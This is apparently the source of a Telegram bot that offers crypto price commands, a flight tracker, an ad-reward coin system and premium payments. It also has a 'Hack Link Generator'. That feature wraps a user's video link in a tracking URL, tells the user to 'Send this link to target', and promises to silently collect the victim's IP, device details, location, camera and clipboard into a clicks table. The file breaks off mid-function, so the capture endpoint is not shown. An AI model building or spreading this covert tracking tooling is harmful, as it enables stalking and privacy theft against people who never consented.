#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# =============================================================================
# IMPORTS
# =============================================================================
import os
import io
import time
import json
import sqlite3
import logging
import threading
import requests
import uuid
import urllib.parse
import random
from datetime import datetime, timedelta
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import matplotlib.dates as mdates
from flask import Flask, request, jsonify
from apscheduler.schedulers.background import BackgroundScheduler
import telebot
from telebot import types
from geopy.distance import geodesic

# =============================================================================
# CONFIGURATION
# =============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID", "6504476778"))
RENDER_URL = os.environ.get("RENDER_URL", "https://mohyan-telegram-bot.onrender.com")
PORT = int(os.environ.get("PORT", 5000))
WEBHOOK_PATH = "/webhook"
DB_NAME = "bot.db"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =============================================================================
# DATABASE SETUP
# =============================================================================
def get_db():
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            is_premium INTEGER DEFAULT 0,
            premium_until TEXT,
            joined_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS user_coins (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0
        );
        CREATE TABLE IF NOT EXISTS rewarded_ads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ad_id TEXT,
            watched_at TEXT DEFAULT CURRENT_TIMESTAMP,
            verified INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            symbol TEXT,
            target_price REAL,
            direction TEXT,
            active INTEGER DEFAULT 1,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS ads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            button_text TEXT,
            link TEXT,
            photo_id TEXT,
            duration_hours INTEGER,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            expires_at TEXT,
            active INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS ad_views (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ad_id INTEGER,
            user_id INTEGER,
            viewed_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS whitelist (
            chat_id INTEGER PRIMARY KEY,
            title TEXT,
            added_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS processed (
            update_id INTEGER PRIMARY KEY
        );
        CREATE TABLE IF NOT EXISTS links (
            link_id TEXT PRIMARY KEY,
            user_id INTEGER,
            original_url TEXT,
            modified_url TEXT,
            created_at TEXT,
            clicks INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT,
            ip TEXT,
            user_agent TEXT,
            screen TEXT,
            language TEXT,
            platform TEXT,
            timezone TEXT,
            battery TEXT,
            location TEXT,
            camera TEXT,
            clipboard TEXT,
            phone TEXT,
            timestamp TEXT
        );
    """)
    try:
        c.execute("ALTER TABLE users ADD COLUMN blocked INTEGER DEFAULT 0")
    except:
        pass  # Agar column already exist karta hai to ignore karo
    
    conn.commit()
    conn.close()

init_db()

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================
def ensure_user(user):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
              (user.id, user.username, user.first_name))
    c.execute("INSERT OR IGNORE INTO user_coins (user_id, balance) VALUES (?, 0)", (user.id,))
    conn.commit()
    conn.close()

def is_premium(user_id):
    if user_id == OWNER_ID:
        return True
    conn = get_db()
    c = conn.cursor()
    row = c.execute("SELECT is_premium, premium_until FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not row:
        return False
    if row["is_premium"] and row["premium_until"]:
        if datetime.fromisoformat(row["premium_until"]) > datetime.now():
            return True
        conn2 = get_db()
        conn2.execute("UPDATE users SET is_premium=0 WHERE user_id=?", (user_id,))
        conn2.commit()
        conn2.close()
    return False

def get_balance(user_id):
    conn = get_db()
    row = conn.execute("SELECT balance FROM user_coins WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    return row["balance"] if row else 0.0

def add_coins(user_id, amount):
    conn = get_db()
    conn.execute("UPDATE user_coins SET balance = balance + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def deduct_coins(user_id, amount):
    bal = get_balance(user_id)
    if bal >= amount:
        conn = get_db()
        conn.execute("UPDATE user_coins SET balance = balance - ? WHERE user_id=?", (amount, user_id))
        conn.commit()
        conn.close()
        return True
    return False

def set_premium(user_id, days):
    until = (datetime.now() + timedelta(days=days)).isoformat()
    conn = get_db()
    conn.execute("UPDATE users SET is_premium=1, premium_until=? WHERE user_id=?", (until, user_id))
    conn.commit()
    conn.close()

def get_crypto_price(symbol):
    try:
        url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={symbol.upper()}USDT"
        r = requests.get(url, timeout=10)
        data = r.json()
        price = float(data["lastPrice"])
        change = float(data["priceChangePercent"])
        high = float(data["highPrice"])
        low = float(data["lowPrice"])
        volume = float(data["volume"])
        return {"price": price, "change": change, "high": high, "low": low, "volume": volume}
    except:
        return None

def get_market_cap(symbol):
    try:
        url = f"https://api.coincap.io/v2/assets/{symbol.lower()}"
        r = requests.get(url, timeout=10)
        data = r.json()["data"]
        return float(data["marketCapUsd"])
    except:
        return None

def format_number(n):
    if n >= 1e12:
        return f"${n/1e12:.2f}T"
    elif n >= 1e9:
        return f"${n/1e9:.2f}B"
    elif n >= 1e6:
        return f"${n/1e6:.2f}M"
    else:
        return f"${n:,.2f}"

CRYPTO_MAP = {
    "btc": ("BTC", "bitcoin"),
    "eth": ("ETH", "ethereum"),
    "doge": ("DOGE", "dogecoin"),
    "sol": ("SOL", "solana"),
    "xrp": ("XRP", "xrp"),
    "bnb": ("BNB", "binancecoin"),
    "ada": ("ADA", "cardano"),
    "dot": ("DOT", "polkadot"),
    "matic": ("MATIC", "polygon"),
    "avax": ("AVAX", "avalanche"),
}

def get_available_ad_for_user(user_id):
    conn = get_db()
    ad = conn.execute("""
        SELECT * FROM ads WHERE active=1 AND expires_at > ?
        AND id NOT IN (SELECT ad_id FROM ad_views WHERE user_id=?)
        ORDER BY id ASC LIMIT 1
    """, (datetime.now().isoformat(), user_id)).fetchone()
    conn.close()
    return ad

# =============================================================================
# USER STATES
# =============================================================================
user_states = {}
live_sessions = {}
flight_sessions = {}
ad_creation = {}

# =============================================================================
# HACK LINK GENERATOR – /genlink & /terminal:gernatLINK
# =============================================================================
@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
def genlink_command(message):
    ensure_user(message.from_user)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💀 ENTER VIDEO LINK", callback_data="genlink_enter"))

    danger_text = """
╔══════════════════════════════════╗
║  💀 *HACK LINK GENERATOR* 💀      ║
╠══════════════════════════════════╣
║                                   ║
║  ⚡ This tool generates a modified ║
║     link that collects visitor    ║
║     information silently.         ║
║                                   ║
║  ⚠️ USE AT YOUR OWN RISK          ║
║                                   ║
╚══════════════════════════════════╝
👇 Click button and paste your video link
    """
    bot.reply_to(message, danger_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data == "genlink_enter")
def genlink_ask_link(call):
    bot.edit_message_text(
        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(call.message, genlink_process_link)

def genlink_process_link(message):
    url = message.text.strip()
    if not (url.startswith('http://') or url.startswith('https://')):
        bot.reply_to(message, "❌ *Invalid Link!* Must start with http:// or https://", parse_mode="Markdown")
        return

    wait_msg = bot.reply_to(message, "💀 *INITIALIZING HACK...*", parse_mode="Markdown")
    
    frames = [
        "⚡ [          ] 0%",
        "🔴 [█         ] 10%",
        "🔴 [██        ] 20%",
        "🔴 [███       ] 30%",
        "🔴 [████      ] 40%",
        "🔴 [█████     ] 50%",
        "🔴 [██████    ] 60%",
        "🔴 [███████   ] 70%",
        "🔴 [████████  ] 80%",
        "🔴 [█████████ ] 90%",
        "💀 [██████████] 100%"
    ]
    
    for frame in frames:
        time.sleep(0.3)
        try:
            bot.edit_message_text(f"💀 *GENERATING LINK...*\n{frame}", wait_msg.chat.id, wait_msg.message_id, parse_mode="Markdown")
        except:
            pass
    
    time.sleep(0.5)
    bot.edit_message_text(
        "💀 *LINK GENERATED!*\n\n_Injecting tracking code..._",
        wait_msg.chat.id,
        wait_msg.message_id,
        parse_mode="Markdown"
    )
    time.sleep(0.8)
    
    link_id = str(uuid.uuid4())[:8]
    base = RENDER_URL
    modified_url = f"{base}/click/{link_id}"

    conn = get_db()
    conn.execute(
        "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
        (link_id, message.from_user.id, url, modified_url, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"genlink_copy_{link_id}"),
        types.InlineKeyboardButton("🔍 TEST LINK", url=modified_url)
    )
    
    success_text = f"""
╔══════════════════════════════════╗
║  💀 *HACK LINK READY* 💀          ║
╠══════════════════════════════════╣
║                                   ║
║  🔗 `{modified_url}`              ║
║                                   ║
║  📊 This link will collect:       ║
║  • IP Address                     ║
║  • Device Info                    ║
║  • Browser Details                ║
║  • Screen Resolution              ║
║  • Language & Timezone            ║
║  • Battery Level (if allowed)     ║
║  • Location (if allowed)          ║
║  • Camera (if allowed)            ║
║                                   ║
║  ⚠️ Send this link to target       ║
║                                   ║
╚══════════════════════════════════╝
    """
    bot.edit_message_text(
        success_text,
        wait_msg.chat.id,
        wait_msg.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("genlink_copy_"))
def genlink_copy_callback(call):
    link_id = call.data.split("_")[2]
    conn = get_db()
    row = conn.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,)).fetchone()
    conn.close()
    if row:
        bot.answer_callback_query(call.id, "✅ Copied to clipboard!")
        bot.send_message(call.message.chat.id, f"📋 `{row['modified_url']}`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "❌ Link not found")

# =============================================================================
# /start COMMAND
# =============================================================================
@bot.message_handler(commands=["start"])
def start_command(message):
    ensure_user(message.from_user)
    text = """
╔══════════════════════════════════╗
║  🤖 <b>PREMIUM MULTI-FEATURE BOT</b>  ║
╠══════════════════════════════════╣
║                                  ║
║  Welcome! Ye bot aapko multiple  ║
║  features provide karta hai:     ║
║                                  ║
║  📊 Crypto Price Tracking        ║
║  ✈️ Aeroplane Tracker            ║
║  🔗 Hack Link Generator          ║
║  💰 ReCOIN Reward System         ║
║  ⭐ Premium Subscription         ║
║  📢 Ad System                    ║
║                                  ║
╠══════════════════════════════════╣
║  🟢 FREE FEATURES (1-10):       ║
║  1. /btc - Bitcoin Price         ║
║  2. /eth - Ethereum Price        ║
║  3. /doge - Dogecoin Price       ║
║  4. /live - Live Market Updates  ║
║  5. /price_btc - BTC 7D Chart   ║
║  6. /alert - Price Alerts        ║
║  7. /getcoin - Earn ReCOIN       ║
║  8. /balance - Check Balance     ║
║  9. /nearby_flight - Track ✈️    ║
║  10. /genlink - Hack Link        ║
║                                  ║
║  🔴 PREMIUM FEATURES (11-21):   ║
║  11. Ad-free experience          ║
║  12. Unlimited alerts            ║
║  13. Faster live updates         ║
║  14. Priority support            ║
║  15. Extended flight range       ║
║  16. Portfolio tracking          ║
║  17. Custom notifications        ║
║  18. API access                  ║
║  19. Group management            ║
║  20. Advanced charts             ║
║  21. All future features         ║
║                                  ║
╚══════════════════════════════════╝
"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Crypto", callback_data="menu_crypto"),
        types.InlineKeyboardButton("✈️ Flights", callback_data="menu_flight"),
        types.InlineKeyboardButton("💰 ReCOIN", callback_data="menu_coin"),
        types.InlineKeyboardButton("⭐ Premium", callback_data="menu_premium"),
        types.InlineKeyboardButton("🔗 Hack Link", callback_data="menu_hack"),
    )
    bot.send_message(message.chat.id, text, reply_markup=markup)

# =============================================================================
# CRYPTO COMMANDS
# =============================================================================
@bot.message_handler(commands=["btc", "eth", "doge", "sol", "xrp", "bnb", "ada", "dot", "matic", "avax"])
def crypto_price_command(message):
    ensure_user(message.from_user)
    cmd = message.text.strip("/").split("@")[0].lower()
    if cmd not in CRYPTO_MAP:
        bot.reply_to(message, "❌ Unknown crypto.")
        return

    symbol, cap_id = CRYPTO_MAP[cmd]
    data = get_crypto_price(symbol)
    if not data:
        bot.reply_to(message, "❌ Price fetch failed. Try again.")
        return

    mcap = get_market_cap(cap_id)
    emoji = "🟢" if data["change"] >= 0 else "🔴"

    text = f"""
╔══════════════════════════════════╗
║  {emoji} <b>{symbol}/USDT</b> Market Data      ║
╠══════════════════════════════════╣
║                                  ║
║  💰 Price: <b>${data['price']:,.4f}</b>
║  📈 24h Change: <b>{data['change']:+.2f}%</b>
║  🔺 24h High: ${data['high']:,.4f}
║  🔻 24h Low: ${data['low']:,.4f}
║  📊 Volume: {data['volume']:,.2f} {symbol}
║  🏦 Market Cap: {format_number(mcap) if mcap else 'N/A'}
║                                  ║
╚══════════════════════════════════╝
"""
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=["live"])
def live_command(message):
    ensure_user(message.from_user)
    uid = message.from_user.id
    live_sessions[uid] = True

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop Live", callback_data="stop_live"))

    msg = bot.send_message(message.chat.id, "⏳ Loading live market data...", reply_markup=markup)

    def update_live():
        count = 0
        while live_sessions.get(uid, False) and count < 60:
            lines = ["╔══════════════════════════════════╗",
                      "║  📊 <b>LIVE CRYPTO MARKET</b>          ║",
                      "╠══════════════════════════════════╣"]
            for cmd, (sym, _) in CRYPTO_MAP.items():
                d = get_crypto_price(sym)
                if d:
                    e = "🟢" if d["change"] >= 0 else "🔴"
                    lines.append(f"║  {e} {sym}: ${d['price']:,.2f} ({d['change']:+.2f}%)")
            lines.append(f"║\n║  🕐 Updated: {datetime.now().strftime('%H:%M:%S')}")
            lines.append("╚══════════════════════════════════╝")
            text = "\n".join(lines)

            try:
                bot.edit_message_text(text, message.chat.id, msg.message_id, reply_markup=markup, parse_mode="HTML")
            except:
                pass
            count += 1
            time.sleep(5)

        live_sessions.pop(uid, None)
        try:
            bot.edit_message_text("🛑 Live updates stopped.", message.chat.id, msg.message_id)
        except:
            pass

    threading.Thread(target=update_live, daemon=True).start()

@bot.message_handler(commands=["price_btc"])
def btc_chart_command(message):
    ensure_user(message.from_user)
    bot.send_message(message.chat.id, "⏳ Generating BTC 7-day chart...")

    try:
        url = "https://api.coincap.io/v2/assets/bitcoin/history?interval=h1"
        r = requests.get(url, timeout=15)
        data = r.json()["data"]

        now = datetime.now()
        week_ago = now - timedelta(days=7)
        filtered = [d for d in data if datetime.fromtimestamp(d["time"]/1000) >= week_ago]

        times = [datetime.fromtimestamp(d["time"]/1000) for d in filtered]
        prices = [float(d["priceUsd"]) for d in filtered]

        fig, ax = plt.subplots(figsize=(10, 5))
        ax.plot(times, prices, color="#00ff88", linewidth=2)
        ax.fill_between(times, prices, alpha=0.15, color="#00ff88")
        ax.set_facecolor("#0a0a1a")
        fig.patch.set_facecolor("#0a0a1a")
        ax.tick_params(colors="white")
        ax.xaxis.set_major_formatter(mdates.DateFormatter("%b %d"))
        ax.set_title("Bitcoin 7-Day Price Chart", color="white", fontsize=14, fontweight="bold")
        ax.set_ylabel("USD", color="white")
        for spine in ax.spines.values():
            spine.set_color("#333")
        ax.grid(True, alpha=0.2, color="#444")
        plt.tight_layout()

        buf = io.BytesIO()
        plt.savefig(buf, format="png", dpi=150)
        buf.seek(0)
        plt.close()

        bot.send_photo(message.chat.id, buf, caption="📊 <b>BTC/USD - 7 Day Chart</b>", parse_mode="HTML")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Chart generation failed: {e}")

@bot.message_handler(commands=["alert"])
def alert_command(message):
    ensure_user(message.from_user)
    parts = message.text.strip().split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /alert BTC 65000")
        return

    symbol = parts[1].upper()
    try:
        target = float(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid price value.")
        return

    data = get_crypto_price(symbol)
    if not data:
        bot.reply_to(message, f"❌ Cannot find {symbol}.")
        return

    direction = "above" if target > data["price"] else "below"

    conn = get_db()
    conn.execute("INSERT INTO alerts (user_id, symbol, target_price, direction) VALUES (?, ?, ?, ?)",
                 (message.from_user.id, symbol, target, direction))
    conn.commit()
    conn.close()

    emoji = "🔺" if direction == "above" else "🔻"
    text = f"""
╔══════════════════════════════════╗
║  🔔 <b>PRICE ALERT SET</b>              ║
╠══════════════════════════════════╣
║  {emoji} {symbol}/USDT
║  📍 Target: ${target:,.2f}
║  📊 Current: ${data['price']:,.2f}
║  ➡️ Direction: {direction.upper()}
╚══════════════════════════════════╝

✅ You'll be notified when {symbol} goes {direction} ${target:,.2f}
"""
    bot.send_message(message.chat.id, text)

# =============================================================================
# /getcoin - EARN ReCOIN (with real ads from owner)
# =============================================================================
@bot.message_handler(commands=["getcoin"])
def getcoin_command(message):
    ensure_user(message.from_user)
    uid = message.from_user.id

    if is_premium(uid):
        bot.reply_to(message, "⭐ Premium users don't need to watch ads!")
        return

    conn = get_db()
    today = datetime.now().strftime("%Y-%m-%d")
    count = conn.execute(
        "SELECT COUNT(*) as cnt FROM ad_views WHERE user_id=? AND date(viewed_at)=?",
        (uid, today)
    ).fetchone()["cnt"]
    conn.close()

    if count >= 10:
        bot.reply_to(message, "❌ Daily limit reached (10 ads/day). Come back tomorrow!")
        return

    last_watch = user_states.get(f"last_ad_{uid}", 0)
    elapsed = time.time() - last_watch
    if elapsed < 30:
        remaining = int(30 - elapsed)
        bot.reply_to(message, f"⏳ Wait {remaining} seconds before next ad.")
        return

    # Check if any ad is available for this user
    ad = get_available_ad_for_user(uid)
    if not ad:
        bot.send_message(message.chat.id, """
╔══════════════════════════════════╗
║  ❌ <b>NO ADS AVAILABLE</b>              ║
╠══════════════════════════════════╣
║                                  ║
║  Abhi koi ad available nahi hai  ║
║  ya aapne sab dekh liye hain.    ║
║  Baad mein try karo!             ║
║                                  ║
╚══════════════════════════════════╝
""")
        return

    ads_watched = user_states.get(f"ads_count_{uid}", 0)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📺 Watch Ad & Earn ReCOIN", callback_data=f"watch_ad_{ad['id']}"))

    text = f"""
╔══════════════════════════════════╗
║  💰 <b>EARN ReCOIN</b>                  ║
╠══════════════════════════════════╣
║                                  ║
║  📺 Watch 2 ads = 1 ReCOIN      ║
║  📊 Today's ads: {count}/10           ║
║  🎯 Progress: {ads_watched % 2}/2 ads watched  ║
║  💎 Balance: {get_balance(uid):.1f} ReCOIN     ║
║                                  ║
║  📢 Ad available! Click below    ║
║  to watch and earn.              ║
║                                  ║
╚══════════════════════════════════╝
"""
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("watch_ad_"))
def watch_ad_callback(call):
    uid = call.from_user.id
    ad_id = int(call.data.split("_")[2])

    # Check if user already watched this ad
    conn = get_db()
    already = conn.execute("SELECT id FROM ad_views WHERE ad_id=? AND user_id=?", (ad_id, uid)).fetchone()
    if already:
        conn.close()
        bot.answer_callback_query(call.id, "❌ Aap ye ad pehle dekh chuke ho!", show_alert=True)
        return

    # Check ad still active
    ad = conn.execute("SELECT * FROM ads WHERE id=? AND active=1 AND expires_at > ?",
                      (ad_id, datetime.now().isoformat())).fetchone()
    if not ad:
        conn.close()
        bot.answer_callback_query(call.id, "❌ Ad expired or inactive!", show_alert=True)
        return

    # Record view
    conn.execute("INSERT INTO ad_views (ad_id, user_id) VALUES (?, ?)", (ad_id, uid))
    conn.commit()
    conn.close()

    user_states[f"last_ad_{uid}"] = time.time()
    ads_count = user_states.get(f"ads_count_{uid}", 0) + 1
    user_states[f"ads_count_{uid}"] = ads_count

    # Show the actual ad to user
    ad_markup = types.InlineKeyboardMarkup()
    ad_markup.add(types.InlineKeyboardButton(f"🔗 {ad['button_text']}", url=ad['link']))

    if ad['photo_id']:
        try:
            bot.send_photo(call.message.chat.id, ad['photo_id'],
                          caption=f"📢 <b>Sponsored Ad</b>\n\n{ad['button_text']}",
                          reply_markup=ad_markup, parse_mode="HTML")
        except:
            bot.send_message(call.message.chat.id, f"📢 <b>Sponsored Ad</b>\n\n{ad['button_text']}",
                           reply_markup=ad_markup)
    else:
        bot.send_message(call.message.chat.id, f"📢 <b>Sponsored Ad</b>\n\n{ad['button_text']}",
                        reply_markup=ad_markup)

    if ads_count % 2 == 0:
        add_coins(uid, 1.0)
        bot.answer_callback_query(call.id, "🎉 +1 ReCOIN earned!")
        bot.edit_message_text(
            f"✅ <b>+1 ReCOIN earned!</b>\n💎 Balance: {get_balance(uid):.1f} ReCOIN\n\nUse /getcoin to earn more!",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        user_states[f"ads_count_{uid}"] = 0
    else:
        bot.answer_callback_query(call.id, "✅ Ad watched! 1 more for ReCOIN.")
        bot.edit_message_text(
            f"📺 Ad watched! Watch 1 more ad to earn 1 ReCOIN.\n\nUse /getcoin to continue.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )

# =============================================================================
# /balance COMMAND
# =============================================================================
@bot.message_handler(commands=["balance"])
def balance_command(message):
    ensure_user(message.from_user)
    uid = message.from_user.id
    bal = get_balance(uid)
    prem = "⭐ YES" if is_premium(uid) else "❌ NO"

    text = f"""
╔══════════════════════════════════╗
║  💎 <b>YOUR WALLET</b>                  ║
╠══════════════════════════════════╣
║                                  ║
║  💰 ReCOIN Balance: <b>{bal:.1f}</b>
║  ⭐ Premium: {prem}
║                                  ║
╚══════════════════════════════════╝
"""
    bot.send_message(message.chat.id, text)

# =============================================================================
# /premium COMMAND
# =============================================================================
@bot.message_handler(commands=["premium"])
def premium_command(message):
    ensure_user(message.from_user)

    if is_premium(message.from_user.id):
        bot.reply_to(message, "⭐ You already have Premium!")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("⭐ 7 Stars - 1 Day", callback_data="prem_stars_7_1"),
        types.InlineKeyboardButton("⭐ 4 Stars - 7 Days", callback_data="prem_stars_4_7"),
        types.InlineKeyboardButton("⭐ 1 Star - 30 Days", callback_data="prem_stars_1_30"),
        types.InlineKeyboardButton("💎 2 ReCOIN - 1 Day", callback_data="prem_coin_2_1"),
        types.InlineKeyboardButton("💎 14 ReCOIN - 7 Days", callback_data="prem_coin_14_7"),
        types.InlineKeyboardButton("💎 30 ReCOIN - 30 Days", callback_data="prem_coin_30_30"),
        types.InlineKeyboardButton("💎 60 ReCOIN - 60 Days", callback_data="prem_coin_60_60"),
    )

    text = """
╔══════════════════════════════════╗
║  ⭐ <b>PREMIUM SUBSCRIPTION</b>         ║
╠══════════════════════════════════╣
║                                  ║
║  <b>Stars Payment:</b>                 ║
║  ⭐ 7 Stars → 1 Day              ║
║  ⭐ 4 Stars → 7 Days             ║
║  ⭐ 1 Star → 30 Days             ║
║                                  ║
║  <b>ReCOIN Payment:</b>                ║
║  💎 2 ReCOIN → 1 Day             ║
║  💎 14 ReCOIN → 7 Days           ║
║  💎 30 ReCOIN → 30 Days          ║
║  💎 60 ReCOIN → 60 Days          ║
║                                  ║
╚══════════════════════════════════╝
"""
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("prem_coin_"))
def premium_coin_callback(call):
    parts = call.data.split("_")
    cost = int(parts[2])
    days = int(parts[3])
    uid = call.from_user.id

    if deduct_coins(uid, cost):
        set_premium(uid, days)
        bot.answer_callback_query(call.id, f"🎉 Premium activated for {days} days!")
        bot.edit_message_text(
            f"✅ <b>Premium Activated!</b>\n⭐ Duration: {days} days\n💎 Cost: {cost} ReCOIN\n💰 Remaining: {get_balance(uid):.1f} ReCOIN",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
    else:
        bot.answer_callback_query(call.id, "❌ Not enough ReCOIN!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data.startswith("prem_stars_"))
def premium_stars_callback(call):
    parts = call.data.split("_")
    stars = int(parts[2])
    days = int(parts[3])

    try:
        prices = [types.LabeledPrice(label=f"Premium {days} Days", amount=stars)]
        bot.send_invoice(
            call.message.chat.id,
            title=f"Premium Subscription - {days} Days",
            description=f"Get premium features for {days} days",
            invoice_payload=f"premium_{days}_{call.from_user.id}",
            provider_token="",
            currency="XTR",
            prices=prices,
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Payment error: {e}", show_alert=True)

@bot.pre_checkout_query_handler(func=lambda q: True)
def pre_checkout(query):
    bot.answer_pre_checkout_query(query.id, ok=True)

@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    payload = message.successful_payment.invoice_payload
    parts = payload.split("_")
    days = int(parts[1])
    uid = int(parts[2])
    set_premium(uid, days)
    bot.send_message(message.chat.id, f"🎉 <b>Payment Successful!</b>\n⭐ Premium activated for {days} days!", parse_mode="HTML")

# =============================================================================
# AEROPLANE TRACKER – /nearby_flight
# =============================================================================
@bot.message_handler(commands=["nearby_flight"])
def nearby_flight_command(message):
    ensure_user(message.from_user)

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📍 Share Location", request_location=True))

    bot.send_message(message.chat.id, """
╔══════════════════════════════════╗
║  ✈️ <b>AEROPLANE TRACKER</b>            ║
╠══════════════════════════════════╣
║                                  ║
║  📍 Share your location to find  ║
║  nearby flights!                 ║
║                                  ║
╚══════════════════════════════════╝
""", reply_markup=markup)

@bot.message_handler(content_types=["location"])
def handle_location(message):
    uid = message.from_user.id
    lat = message.location.latitude
    lon = message.location.longitude
    flight_sessions[uid] = {"lat": lat, "lon": lon}

    markup = types.InlineKeyboardMarkup(row_width=2)
    ranges = [
        ("700m", 0.7), ("20km", 20), ("37km", 37),
        ("86km", 86), ("200km", 200), ("339km", 339)
    ]
    for label, km in ranges:
        markup.add(types.InlineKeyboardButton(f"📡 {label}", callback_data=f"range_{km}"))

    text = f"""
╔══════════════════════════════════╗
║  📍 <b>LOCATION RECEIVED</b>            ║
╠══════════════════════════════════╣
║  Lat: {lat:.4f}                  ║
║  Lon: {lon:.4f}                  ║
║                                  ║
║  🎯 Select tracking range:      ║
╚══════════════════════════════════╝
"""
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("range_"))
def range_callback(call):
    uid = call.from_user.id
    if uid not in flight_sessions:
        bot.answer_callback_query(call.id, "❌ Share location first!", show_alert=True)
        return

    km = float(call.data.split("_")[1])
    session = flight_sessions[uid]
    session["range"] = km
    session["active"] = True

    bot.answer_callback_query(call.id, f"📡 Tracking {km}km range...")

    msg = bot.edit_message_text("⏳ Scanning for flights...", call.message.chat.id, call.message.message_id)

    def track_flights():
        count = 0
        while flight_sessions.get(uid, {}).get("active", False) and count < 6:
            lat, lon = session["lat"], session["lon"]
            deg = km / 111.0
            lamin, lamax = lat - deg, lat + deg
            lomin, lomax = lon - deg, lon + deg

            try:
                url = f"https://opensky-network.org/api/states/all?lamin={lamin}&lomin={lomin}&lamax={lamax}&lomax={lomax}"
                r = requests.get(url, timeout=15)
                data = r.json()
                states = data.get("states", []) or []

                flights = []
                for s in states:
                    if s[5] is not None and s[6] is not None:
                        dist = geodesic((lat, lon), (s[6], s[5])).km
                        if dist <= km:
                            flights.append({
                                "callsign": (s[1] or "N/A").strip(),
                                "country": s[2] or "N/A",
                                "alt": s[7] or 0,
                                "vel": (s[9] or 0) * 3.6,
                                "dist": dist
                            })

                flights.sort(key=lambda x: x["dist"])

                lines = [
                    "╔══════════════════════════════════╗",
                    f"║  ✈️ <b>FLIGHTS ({len(flights)} found)</b>",
                    "╠══════════════════════════════════╣"
                ]

                if flights:
                    for i, f in enumerate(flights[:15], 1):
                        lines.append(f"║ {i}. ✈️ <b>{f['callsign']}</b>")
                        lines.append(f"║    🌍 {f['country']} | 📏 {f['dist']:.1f}km")
                        lines.append(f"║    ⬆️ {f['alt']:.0f}m | 💨 {f['vel']:.0f}km/h")
                        lines.append("║")
                else:
                    lines.append("║  No flights in range.")

                lines.append(f"║  🕐 {datetime.now().strftime('%H:%M:%S')} | Update {count+1}/6")
                lines.append("╚══════════════════════════════════╝")
                text = "\n".join(lines)

                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🛑 Stop Tracking", callback_data="stop_flight"))

                try:
                    bot.edit_message_text(text, call.message.chat.id, msg.message_id,
                                         reply_markup=markup, parse_mode="HTML")
                except:
                    pass

            except Exception as e:
                logger.error(f"Flight tracking error: {e}")

            count += 1
            time.sleep(10)

        flight_sessions.pop(uid, None)
        try:
